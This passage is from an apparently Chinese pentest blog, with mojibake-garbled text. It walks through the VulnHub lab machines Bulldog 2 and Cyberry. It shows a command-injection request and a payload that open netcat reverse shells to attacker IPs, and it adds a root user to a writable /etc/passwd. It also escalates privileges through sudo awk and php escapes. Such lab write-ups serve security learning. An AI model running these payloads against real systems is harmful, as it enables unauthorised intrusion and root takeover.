id="getshell">getshell</h2><p>çœ‹webä»£ç è¿˜æ˜¯ä¹ æƒ¯å…ˆçœ‹router,æ–¹ä¾¿äº†è§£ç½‘ç«™çš„åŠŸèƒ½ ä¸€æ‰“å¼€routerå°±å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const &#123;exec&#125; = require(&#x27;child_process&#x27;);</span><br></pre></td></tr></table></figure><p>ctrl+fæœä¸€ä¸‹,å‘ç°å…³é”®ä»£ç  <img src="/images/2018/09/2018-09-17-14-58-42å±å¹•æˆªå›¾.png" alt="blacsheep" /> å³åœ¨<code>/linkauthenticate</code>é¡µé¢å­˜åœ¨ä¸€ä¸ªä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ burpæŠ“ä¸‹åŒ…,æ”¹postå’Œè·¯å¾„,å¸¦ä¸Šå‘½ä»¤æ³¨å…¥çš„ä¿¡æ¯,æ³¨æ„å¸¦ä¸Š<code>Content-type: application/json</code> æˆ‘ä»¬pingä¸€ä¸‹,æœ¬æœº<code>tcpdump -nni wlan0 icmp</code> <img src="/images/2018/09/2018-09-17-15-08-55å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¾—åˆ°å›æ˜¾,æœ¬æ¥è¿™é‡Œåº”è¯¥ç›´æ¥åå¼¹shellçš„,ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆåå¼¹ä¸äº†,çŒœæµ‹æ˜¯å­—ç¬¦çš„é—®é¢˜,æ‰€ä»¥æ¢äº†ä¸ªæ–¹å¼,æˆ‘ä»¬payloadé‡Œé¢è®©ncè·å¾—çš„ä¿¡æ¯ç”¨ç®¡é“ç¬¦è½¬åˆ°bash,ç„¶ååœ¨ncé‡Œé¢è®©å®ƒæ‰§è¡Œåå¼¹shellçš„å‘½ä»¤,æœ€åæˆ‘ä»¬çš„æ•°æ®åŒ…å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users/linkauthenticate</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.121</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/json;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;465-1649e73083e&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Sun, 15 Jul 2018 14:58:16 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>77</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;;nc 192.168.43.245 6712  /bin/bash&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°shell <img src="/images/2018/09/2018-09-17-15-14-09å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ææƒ-1">ææƒ</h2><p>æ²¡æœ‰ç”¨æˆ·çš„å¯†ç ,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹æœ¬æœºæœ‰æ²¡æœ‰ä»€ä¹ˆé…ç½®é—®é¢˜å¯¼è‡´å¯ä»¥ææƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ ls -l /etc  grep passwd</span><br><span class="line">ls -l /etc  grep passwd</span><br><span class="line">-rwxrwxrwx 1 root root       1728 Sep 17 04:46 passwd</span><br><span class="line">-rw-r--r-- 1 root root       1650 Jul 15 04:06 passwd-</span><br></pre></td></tr></table></figure><p>å‘ç°passwdæ˜¯å¯å†™çš„,é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å†™å…¥ä¸€ä¸ªæ–°çš„ç”¨æˆ·å°±å¯ä»¥äº† ç”¨opensslç”Ÿæˆå¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ode@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ openssl passwd -1 -salt cnss blacsheep</span><br><span class="line">s blacsheepswd -1 -salt cnss</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1$cnss<span class="variable">$LUsyAIs8qkoK</span>/EBDFmYs61</span></span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªæ–°çš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacsheep:$1$cnss$LUsyAIs8qkoK/EBDFmYs61:0:0:,,,:/home/node:/bin/bash</span><br></pre></td></tr></table></figure><p>ç„¶åechoåˆ°passwdé‡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;blacsheep:\$1\$cnss\$LUsyAIs8qkoK/EBDFmYs61:0:0:,,,:/home/node:/bin/bash&quot;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„\$è½¬ä¹‰ä¸€ä¸‹ ç„¶åå°±æ‹¿åˆ°rootäº† <img src="/images/2018/09/2018-09-17-15-29-03å±å¹•æˆªå›¾.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€å­¦ä¹ (Cyberry,lampiao)</title>
      <link href="/2018/09/15/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0cyberry/"/>
      <url>/2018/09/15/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0cyberry/</url>
      
        <content type="html"><![CDATA[<h1 id="cyberry">Cyberry</h1><h2 id="ä»‹ç»">ä»‹ç»</h2><p>ç›¸å…³èµ„æ–™éƒ½åœ¨:<a href="https://www.vulnhub.com/entry/cyberry-1,217/" title="https://www.vulnhub.com/entry/cyberry-1,217/">https://www.vulnhub.com/entry/cyberry-1,217/</a> å®‰å…¨å®¢åŸæ–‡:<a href="https://www.anquanke.com/post/id/154504" title="https://www.anquanke.com/post/id/154504">https://www.anquanke.com/post/id/154504</a> é¦–å…ˆè¿‡å»ä¸‹ä¸ªé•œåƒç„¶åå¯¼è¿›è™šæ‹Ÿæœºå°±ok</p><h2 id="åˆæ­¥ä¿¡æ¯æ”¶é›†">åˆæ­¥ä¿¡æ¯æ”¶é›†</h2><p>æ‰«ä¸€ä¸‹ip <img src="/images/2018/09/2018-09-15-12-55-43å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¾—åˆ°é¶æœºip:192.168.1.100 ç„¶åæ‰«ä¸€ä¸‹ç«¯å£ <img src="/images/2018/09/2018-09-15-13-00-27å±å¹•æˆªå›¾.png" alt="blacsheep" /> å»80ç«¯å£çœ‹ä¸€ä¸‹ æºç é‡Œé¢æœ‰ä¸€äº›base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- bmljZSB0cnkh --&gt;</span><br><span class="line">&lt;!-- bm90aGluZyB0byBzZWUgaGVyZSE= --&gt;</span><br><span class="line">&lt;!-- dGltZSB0byBtb3ZlIG9uIQ== -&gt;</span><br><span class="line">&lt;!-- c2VjcmV0ZmlsZS5odG1s -&gt;</span><br><span class="line">&lt;!-- d29yay1pbi1wcm9ncmVzcy5wbmc= --&gt;</span><br></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªå›¾ç‰‡æ˜¯ work-in-progress.png,ä¸è¿‡ä¼¼ä¹å¹¶ä¸æ˜¯å›¾ç‰‡,é‚£ä¹ˆæˆ‘ä»¬curlä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~$ curl http://192.168.1.100/work-in-progress.png</span><br><span class="line">edocrq</span><br></pre></td></tr></table></figure><p>å»edocrqçœ‹ä¸‹ <img src="/images/2018/09/2018-09-15-13-07-15å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°äºŒç»´ç ,æ‰«ä¸€ä¸‹,ç„¶åæ‰¾åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/berrypedia.html#</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿˜æ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ æ‰«ä¸€ä¸‹ç›®å½• <img src="/images/2018/09/2018-09-15-13-13-46å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åæœ‰ä¸ªphpmyadmin,å°è¯•ä¸€ä¸ªroot/root,å¤±è´¥äº†,æ‰“ç®—ä»å…¶ä»–ç«¯å£ä¸‹æ‰‹,ç„¶åftpçœ‹èƒ½ä¸èƒ½åŒ¿åç™»å½•,å‘ç°ä¸èƒ½,666ç«¯å£ncä¸€ä¸‹ä¹Ÿå¹¶ä¸èƒ½è¿æ¥,ç„¶åå‘ç°å…¶å®æ˜¯closeçš„ åšåˆ°è¿™é‡Œå°±å¹¶ä¸ä¼šäº†</p><h2 id="knockå¼€ç«¯å£">knockå¼€ç«¯å£</h2><p>çœ‹äº†ä¸‹wp,å‘ç°è¿™é‡Œæ˜¯ä¸ªè„‘æ´... <code>http://192.168.1.100/berrypedia.html#</code>çš„<code>http://192.168.1.100/placeho1der.jpg</code>é¡µé¢çš„å›¾ç‰‡é‡Œé¢è—äº†ä¸œè¥¿.. é¦–å…ˆç¿»è½¬ä¸€ä¸‹,ç„¶åè°ƒæ•´ä¸€ä¸‹ <img src="/images/2018/09/t01e3adfe1bf193f9b4.png" alt="blacsheep" /> ç»™ä¸ªå®‰å…¨å®¢ä¸Šé¢çš„åˆ†æ</p><blockquote><p>è¿™é‡Œå°±å¾ˆæœ‰æ„æ€äº†ï¼Œæœ‰å››ä¸ªäººï¼Œæœ€ä¸Šæ–¹è¿˜æœ‰ä¸€éƒ¨åˆ†ï¼Œå‡ºç°äº†PORTå­—æ ·ï¼Œä¸€æ—¶åŠä¼šæœ‰äº›è’™è”½ï¼Œä½†æ˜¯æ˜¾ç„¶è¿™ä¸ªé¶æœºå…¥å£å°±åœ¨è¿™é‡Œäº†(æ€»ä¸ä¼šæ— ç¼˜æ— æ•…ç»™ä¸€å¼ è¿™æ ·çš„å›¾å§- -)ã€‚ç„¶åï¼Œæˆ‘åˆ†åˆ«æŠŠè¿™å››ä¸ªäººæˆªå›¾ä¸‹æ¥ï¼Œç”¨æµè§ˆå™¨çš„è¯†åˆ«åŠŸèƒ½å»æŸ¥äº†è¿™å››ä¸ªäººï¼Œäº†è§£äº†ä¸€ä¸‹å„ä¸ªäººçš„ä¿¡æ¯ï¼Œè¿™å››ä¸ªäººåˆ†åˆ«æ˜¯Smiley Lewis, Dave Edmunds, Fats Dominoå’ŒGale Stormï¼Œé¦–å…ˆï¼Œä»–ä»¬éƒ½æ˜¯è‰ºæœ¯å®¶ï¼Œéƒ½æ¼”å¥äº†åŒä¸€é¦–æ­Œæ›²ï¼Œåå­—å«ï¼Œâ€I hear you knockingâ€ï¼Œå¹´ä»½åˆ†åˆ«æ˜¯ï¼Œ1970ï¼Œ1955ï¼Œ1955ï¼Œ1961ï¼Œè¿™å·®ä¸å¤šæ˜¯å…±åŒç‚¹äº†ï¼Œè¿˜æ˜¯å¾ˆè’™è”½0.0ï¼Œè¿™é‡Œç»“åˆäº†çŸ¥è¯†é¢å’Œè„‘æ´ã€‚ã€‚åŸæ¥è·Ÿknockæœ‰å…³ï¼Œlinuxä¸‹æœ‰ä¸ªå‘½ä»¤knockå¯ä¾›å®‰è£…ä½¿ç”¨ï¼Œç«¯å£è¯•æ¢ï¼ˆport knockingï¼‰æ˜¯ä¸€ç§é€šè¿‡è¿æ¥å°è¯•ï¼Œä»å¤–éƒ¨æ‰“å¼€åŸå…ˆå…³é—­ç«¯å£çš„æ–¹æ³•ã€‚ä¸€æ—¦æ”¶åˆ°æ­£ç¡®é¡ºåºçš„è¿æ¥å°è¯•ï¼Œé˜²ç«å¢™å°±ä¼šåŠ¨æ€æ‰“å¼€ä¸€äº›ç‰¹å®šçš„ç«¯å£ç»™å…è®¸å°è¯•è¿æ¥çš„ä¸»æœºï¼ŒçŸ¥é“è¿™ä¸ªå°±æ˜ç™½ä¸Šé¢é‚£ä¸ªPORTçš„æ„æ€äº†ï¼Œæ˜¾ç„¶æ˜¯æœ‰æŸä¸ªç«¯å£æ²¡æœ‰è¢«æ‰“å¼€ï¼Œéœ€è¦æˆ‘ä»¬knockå¼€ã€‚é‚£å¹´ä»½å°±è¦ç”¨ä¸Šäº†ï¼Œä»å·¦ä¸Šä¾æ¬¡åˆ°å³ä¸‹knock 192.168.107.132 1970 1955 1955 1961ã€‚knockä¹‹åï¼Œå†æ¥æ‰«æç«¯å£ï¼Œä»1-65535</p></blockquote><p><img src="/images/2018/09/2018-09-15-13-28-36å±å¹•æˆªå›¾.png" alt="blacsheep" /> emmm..è¯•äº†ä¸€ä¸‹,å‘ç°æ–°å¼€äº†ç«¯å£ <img src="/images/2018/09/2018-09-15-13-28-24å±å¹•æˆªå›¾.png" alt="blacsheep" /> å»<a href="http://192.168.1.100:61955/" title="http://192.168.1.100:61955/">http://192.168.1.100:61955/</a>çœ‹ä¸‹ å†å»æ‰«ä¸€ä¸‹ç›®å½•,å‘ç°å¤šäº†ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ http://192.168.1.100:61955/H (CODE:200SIZE:768)  </span><br></pre></td></tr></table></figure><p>ä¸Šå»çœ‹ä¸‹,å‘ç°æ˜¯ä¸ªbrainfuckçš„é¡µé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</span><br><span class="line">///////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------[--&gt;+++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;.----.++++++++++++.[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;.--------.++++++++.-----------.+++.+++++++++++++.+.</span><br><span class="line"></span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.[---&gt;+&lt;]&gt;---.+[-&gt;+++&lt;]&gt;+.++++++++.</span><br><span class="line"></span><br><span class="line">+[-----&gt;+++&lt;]&gt;+.-------.+++++++++++..-------.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;.-----.------.++++++++.</span><br><span class="line"></span><br><span class="line">--------[--&gt;+++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;.+++++++++++++..+++++++.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;-.------------.--[---&gt;+&lt;]&gt;---.+++++++.</span><br><span class="line"></span><br><span class="line">+[-----&gt;+++&lt;]&gt;++++.------.+++++++++++++..+++++++.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;++.+++++++.-[--&gt;+&lt;]&gt;-.[--&gt;+&lt;]&gt;+++.[-&gt;+++&lt;]&gt;++.-.++++++++++.------.++++++++++.---------..</span><br></pre></td></tr></table></figure><p>è§£å¯†ä¸€ä¸‹å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line"></span><br><span class="line">team members</span><br><span class="line">chuck</span><br><span class="line">halle</span><br><span class="line">nick</span><br><span class="line">terry</span><br><span class="line">mary</span><br><span class="line">kerry</span><br><span class="line">pw: bakeoff</span><br></pre></td></tr></table></figure><p>å¥½çš„,åˆ°è¿™é‡Œé‚£åº”è¯¥å°±æ˜¯å»çˆ†å¯†ç äº†</p><h2 id="è¿ftp">è¿ftp</h2><p><img src="/images/2018/09/2018-09-15-13-42-22å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åsshè¿ä¸ä¸Šå»,ä½†æ˜¯å¯ä»¥è¿ftp <img src="/images/2018/09/2018-09-15-14-24-41å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¿ä¸Šå»ä¹‹åæœ‰ä¸ª.bash_historyç›®å½•,è¿›å»ä¹‹åå‘ç°æœ‰ä¸¤ä¸ªéšè—æ–‡ä»¶,getä¸‹æ¥,æŸ¥çœ‹ä¸€ä¸‹ <img src="/images/2018/09/2018-09-15-14-27-55å±å¹•æˆªå›¾.png" alt="blacsheep" /> ä¸€ä¸ªæ˜¯opensslçš„åŠ å¯†æ–‡ä»¶,ä¸€ä¸ªæ˜¯å¯†ç æ–‡ä»¶,é‚£ä¹ˆæˆ‘ä»¬ç”¨å‘½ä»¤æ¥è§£ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `openssl enc -ciphers  tail -n +2` ; do for j in `cat .trash`; do openssl $&#123;i:1&#125; -d -salt -md md5 -in .reminder.enc -out &quot;decrypted$i$j&quot; -k $j; done;done 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¼šè§£å¯†å‡ºå¾ˆå¤šæ–‡ä»¶,æˆ‘ä»¬è¦å»æ‰¾æ˜æ–‡,æ‰€ä»¥æˆ‘ä»¬æ‰¾ascii textçš„æ˜æ–‡ <img src="/images/2018/09/2018-09-15-14-34-50å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¾—åˆ°å¯†ç dangleberry69</p><h2 id="webçš„å‘½ä»¤æ‰§è¡Œ">webçš„å‘½ä»¤æ‰§è¡Œ</h2><p>å›åˆ°login.php,å¸å·mary,å¯†ç dangleberry69ç™»å½•ä¸€ä¸‹ <img src="/images/2018/09/2018-09-15-14-37-15å±å¹•æˆªå›¾.png" alt="blacsheep" /> çœ‹åˆ°ä¸‹é¢çš„é‚£ä¸ª,æ˜¯ä¸ªdnsè§£æ,æˆ‘ä»¬è¯•è¯•çœ‹å‘½ä»¤æ‰§è¡Œ <img src="/images/2018/09/2018-09-15-14-40-32å±å¹•æˆªå›¾.png" alt="blacsheep" /> payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=blog.blacsheep.cn;nc -e /bin/bash 192.168.1.105 6712</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shell <img src="/images/2018/09/2018-09-15-14-42-45å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå†™ä¸€ä¸ªshellè¿›å»,æ–¹ä¾¿ä¼ æ–‡ä»¶ææƒ <img src="/images/2018/09/2018-09-15-14-44-34å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ææƒ">ææƒ</h2><p>çœ‹ä¸‹å†…æ ¸ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@cyberry:/tmp$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux cyberry 3.16.0-4-686-pae #1 SMP Debian 3.16.43-2+deb8u5 (2017-09-19) i686 GNU/Linux</span><br></pre></td></tr></table></figure><p>å»searchsploitçœ‹ä¸‹ <img src="/images/2018/09/2018-09-15-14-52-33å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¯•äº†ä¸€ä¸‹è¿™ä¸ªexp,å¤±è´¥äº†,å¼€å§‹æ‰¾æ–°çš„æ€è·¯ æ–‡ä»¶ç›®å½•æœ‰ä¸ªnb-latinæ–‡ä»¶,çœ‹æ ·å­é‡Œé¢æ˜¯å¯†ç  <img src="/images/2018/09/2018-09-15-15-11-38å±å¹•æˆªå›¾.png" alt="blacsheep" /> æŠŠè¿™ä¸ªå†™åˆ°pass.dicå†ç”¨hydraçˆ†ä¸€ä¸‹ <img src="/images/2018/09/2018-09-15-15-10-29å±å¹•æˆªå›¾.png" alt="blacsheep" /> sshè¿ä¸€ä¸‹,å‘ç°å¯ä»¥è¿ä¸Šå» <img src="/images/2018/09/2018-09-15-15-14-10å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶å<code>sudo -l</code>çœ‹ä¸‹ <img src="/images/2018/09/2018-09-15-15-26-16å±å¹•æˆªå›¾.png" alt="blacsheep" /> æˆ‘ä»¬åªèƒ½ç”¨terryçš„èº«ä»½è¿è¡Œinvoke.sh,é‚£ä¹ˆè¯•ä¸€ä¸‹ <img src="/images/2018/09/2018-09-15-15-29-49å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°ä¼šå»æ‰“å¼€æ–‡ä»¶,é‚£ä¹ˆæˆ‘ä»¬è®©ä»–å»å¼€/bin/bash,å‘ç°æ‹¿åˆ°äº†terryçš„æƒé™ <img src="/images/2018/09/2018-09-15-15-30-55å±å¹•æˆªå›¾.png" alt="blacsheep" /> <code>sudo -l</code>ä¸€ä¸‹çœ‹èƒ½æ‰§è¡Œä»€ä¹ˆ <img src="/images/2018/09/2018-09-15-15-31-45å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°å¯ä»¥æ‰§è¡Œawk,æˆ‘ä»¬googleçœ‹ä¸‹awkå¦‚ä½•æ‰§è¡Œå‘½ä»¤ å‚è€ƒ:<a href="https://blog.csdn.net/imzoer/article/details/8742603" title="https://blog.csdn.net/imzoer/article/details/8742603">https://blog.csdn.net/imzoer/article/details/8742603</a> ç„¶åpayload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">terry@cyberry:/home/nick$ sudo -u halle awk &#x27;&#123;cmd=&quot;/bin/bash&quot;;system(cmd)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">halle@cyberry:/home/nick$ </span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-15-15-36-58å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå†<code>sodo -l</code>,å¾—åˆ°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">halle@cyberry:/home/nick$ sudo -l</span><br><span class="line">Matching Defaults entries for halle on cyberry:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User halle may run the following commands on cyberry:</span><br><span class="line">    (chuck) SETENV: NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç”¨chuckæ‰§è¡Œphpçš„shellå°±å¥½ <img src="/images/2018/09/2018-09-15-15-42-29å±å¹•æˆªå›¾.png" alt="blacsheep" /> ä¸è¿‡ä¸€æ—¦è¿ä¸Šå»å¾ˆå¿«å°±æ–­äº†... ä¸è¿‡æ²¡å…³ç³»..æˆ‘ä»¬systemé‡Œé¢å†™ä»£ç ä¸€æ ·ç›¸å½“ä¸chuckçš„æƒé™,ç„¶åè¯»åˆ°sshkey <img src="/images/2018/09/2018-09-15-16-12-37å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå»å¯†é’¥ç™»å½•,ä½†æ˜¯å¤±è´¥äº†.. å†å»çœ‹ä¸‹å‰é¢çš„deleteæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">halle@cyberry:~$ echo &quot;&lt;?php var_dump(system(&#x27;cat /home/chuck/.deleted/deleted&#x27;));?&gt;&quot;&gt;1.php</span><br><span class="line">halle@cyberry:~$ sudo -u chuck php 1.php</span><br><span class="line">From:       Berry, Chuck (chuckberry@cyberry)</span><br><span class="line">Sent:       Wednesday, November 22, 2017 2:52pm</span><br><span class="line">To:     Nick, Chuck (nickberry@cyberry)</span><br><span class="line">Subject:    Re: Christmas Meal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thanks Nick, that might just help me out!</span><br><span class="line"></span><br><span class="line">He did give me a few minor clues...</span><br><span class="line"></span><br><span class="line">The password starts with &quot;che&quot; and ends with &quot;rry&quot;</span><br><span class="line"></span><br><span class="line">letter e is used three times</span><br><span class="line">letter c is used twice</span><br><span class="line">letter r is used twice</span><br><span class="line">letter b is used twice</span><br><span class="line">letter a is used twice</span><br><span class="line"></span><br><span class="line">The only other letters in the password were h,w,m &amp; y</span><br><span class="line"></span><br><span class="line">I think I&#x27;ll probably have to write a little script to bruteforce SSH</span><br><span class="line">with what I already know. If I get it done before close of business </span><br><span class="line">I&#x27;ll get onto sorting out the Christmas meal. Promise!</span><br><span class="line"></span><br><span class="line">Thanks again</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Ah ok buddy. I don&#x27;t know if it helps you in any way</span><br><span class="line">but I saw the password jotted down on a post-it note in his office</span><br><span 